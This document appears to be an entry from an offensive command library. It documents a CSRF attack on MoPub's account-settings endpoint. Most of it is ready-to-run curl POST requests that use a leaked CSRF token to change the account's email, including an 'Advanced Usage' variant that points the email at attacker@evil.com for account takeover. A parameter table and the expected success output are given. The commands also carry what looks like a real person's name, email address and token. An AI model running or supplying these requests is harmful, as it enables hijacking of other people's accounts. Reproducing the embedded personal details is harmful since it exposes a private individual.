---
id: cmd-mopub-csrf-change-001
data: |-
  curl -X POST 'https://app.mopub.com/account/settings/change/user/' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Referer: https://app.mopub.com/account/settings/change/user/' \
    -H 'Cookie: csrftoken=gAZoQVneb98vFmy92vZH6IuHi0Hmsh00;' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-raw 'csrfmiddlewaretoken=gAZoQVneb98vFmy92vZH6IuHi0Hmsh00&first_name=prashanth&last_name=varma&email=prashanthvarmadomma@gmail.com&title=prashanth&mailing_list=on&confirm_password=&hidden_email=prashanthvarmadomma@gmail.com'
tags:
  - csrf
  - account-takeover
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.917Z'
verified: false
validated: true
submitted: true
---
# csrf-account-settings-change

## Command

```bash
curl -X POST 'https://app.mopub.com/account/settings/change/user/' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://app.mopub.com/account/settings/change/user/' \
  -H 'Cookie: csrftoken=gAZoQVneb98vFmy92vZH6IuHi0Hmsh00;' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'csrfmiddlewaretoken=gAZoQVneb98vFmy92vZH6IuHi0Hmsh00&first_name=prashanth&last_name=varma&email=prashanthvarmadomma@gmail.com&title=prashanth&mailing_list=on&confirm_password=&hidden_email=prashanthvarmadomma@gmail.com'
```

## Description

This command sends a forged HTTP POST request to MoPub's account settings endpoint to change user details like email, using a leaked CSRF token obtained via XSS or proxy leakage. It demonstrates a CSRF attack enabling unauthorized account modifications when protections are bypassed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `email` | New email address to set for the account | Yes |
| `title` | User's title or job role | No |
| `last_name` | User's last name | No |
| `first_name` | User's first name | No |
| `hidden_email` | Mirrors the email field for form validation | Yes |
| `mailing_list` | Subscription status (on/off) | No |
| `confirm_password` | Password confirmation (often empty in CSRF) | No |
| `csrfmiddlewaretoken` | Leaked CSRF token for bypassing protection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://app.mopub.com/account/settings/change/user/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'csrfmiddlewaretoken=LEAKED_TOKEN&email=new@email.com&hidden_email=new@email.com'
```

### Advanced Usage

Include full headers and all fields as in the primary command for realism, adjusting the CSRF token and email.

```bash
curl -X POST 'https://app.mopub.com/account/settings/change/user/' \
  -H 'Cookie: csrftoken=LEAKED_TOKEN;' \
  --data-raw 'csrfmiddlewaretoken=LEAKED_TOKEN&email=attacker@evil.com&first_name=Victim&last_name=User&title=Admin&mailing_list=on&hidden_email=attacker@evil.com'
```

## Expected Output

A successful response (HTTP 200 or 302 redirect) indicating the account settings update, such as a confirmation page or dashboard reload with the new email applied.

## Related

- [[procedures/Exploit-XSS-for-Session-Hijacking-and-CSRF-Leak]]
- [[MoPub XSS in Link Items Click URL Leading to Session Hijacking and Account Takeover]]
